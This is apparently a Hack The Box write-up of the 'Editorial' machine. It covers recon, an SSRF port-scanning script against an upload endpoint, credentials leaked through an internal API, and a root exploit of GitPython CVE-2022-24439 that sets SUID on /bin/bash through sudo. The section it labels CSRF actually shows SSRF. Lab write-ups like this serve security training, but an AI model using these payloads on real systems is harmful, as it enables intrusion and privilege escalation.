---
layout: single
title: Editorial - Hack The Box
excerpt: "Editorial is an easy difficulty Linux machine that features a publishing web application vulnerable to 'Server-Side Request Forgery (SSRF)'. This vulnerability is leveraged to gain access to an internal running API, which is then leveraged to obtain credentials that lead to `SSH` access to the machine. Enumerating the system further reveals a Git repository that is leveraged to reveal credentials for a new user. The 'root' user can be obtained by exploiting [CVE-2022-24439](https://nvd.nist.gov/vuln/detail/CVE-2022-24439) and the sudo configuration."
date: 2025-05-14
classes: wide
header:
  teaser: /img2/editorial.PNG
  teaser_home_page: true
  icon: /img2/images/hackthebox.webp
categories:
  - hackthebox
  - Linux
  - Easy
tags:
  - Virtual Hosting
  - Abusing File Upload
  - Server Side Request Forgery (SSRF) Exploitation + Internal Port Discovery
  - API enumeration through SSRF
  - Private Github Project Enumeration + Information Leakage
  - Abusing sudoers [Privilege Escalation] - GitPython Exploitation (CVE-2022-24439)
---


## Reconnaissance

- Nmap

```bash
nmap -sS --open -p- --min-rate 5000 -vvv -n -Pn 10.10.11.20
```

![](/img2/Pasted%20image%2020250513193159.png)

- Whatweb

```bash
whatweb http://editorial.htb/
```

![](/img2/Pasted%20image%2020250513193605.png)

## Exploitation

- Cross-Site Request Forgery (CSRF)

![](/img2/Pasted%20image%2020250513202442.png)

```bash
python3 -m http.server 80
```

![](/img2/Pasted%20image%2020250513202527.png)

![](/img2/Pasted%20image%2020250513202610.png)

- Internal Port Discovery

```python
import requests
import json


url = "http://editorial.htb/upload-cover"

headers = {
    "Host": "editorial.htb",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "multipart/form-data; boundary=---------------------------95631414351576674691067>
    "Origin": "http://editorial.htb",
    "Connection": "close",
    "Referer": "http://editorial.htb/upload",
    "Priority": "u=0"
}


for i in range(1,10000):
  data = (
    "-----------------------------956314143515766746910679362\r\n"
    'Content-Disposition: form-data; name="bookurl"\r\n'
    "\r\n"
    f"http://127.0.0.1:{i}/\r\n"
    "-----------------------------956314143515766746910679362\r\n"
    'Content-Disposition: form-data; name="bookfile"; filename=""\r\n'
    "Content-Type: application/octet-stream\r\n"
    "\r\n"
    "\r\n"
    "-----------------------------956314143515766746910679362--\r\n"
 )

  response = requests.post(url, headers=headers, data=data)
  if response.text.split(".")[-1] != "jpeg":
    print(f"[+] Port [{i}] --> {response.text.split()}")
    url2=f"http://editorial.htb/{response.text.strip()}"
    response2=requests.get(url2)
    raw= response2.text
    parsed=json.loads(raw)
    pretty=json.dumps(parsed,indent=2)
    print(pretty)
```

```bash
python3 bruteforce.py
```

![](/img2/Pasted%20image%2020250513214600.png)

- API and CSRF

![](/img2/Pasted%20image%2020250514101432.png)

```bash
curl http://editorial.htb/static/uploads/4e46c640-61de-42f9-9477-7388274ea064
```

```
{
  "template_mail_message": "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."       }
```

- Connect to ssh

```bash
ssh dev@10.10.11.20
```

## Post-exploitation

- Check hidden files 

```bash
ls -la
```

![](/img2/Pasted%20image%2020250514102037.png)

- Check git commits

```bash
git log --oneline
```

![](/img2/Pasted%20image%2020250514102938.png)

```bash
git show b73481b
```

![](/img2/Pasted%20image%2020250514103044.png)

- Pivoting

```bash
su prod
```

- Check sudoers

```bash
sudo -l
```

![](/img2/Pasted%20image%2020250514103212.png)

- Exploit GitPython (CVE-2022-24439)

```bash
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c chmod% u+s% /bin/bash'
```

```bash
bash -p
```

![](/img2/Pasted%20image%2020250514105308.png)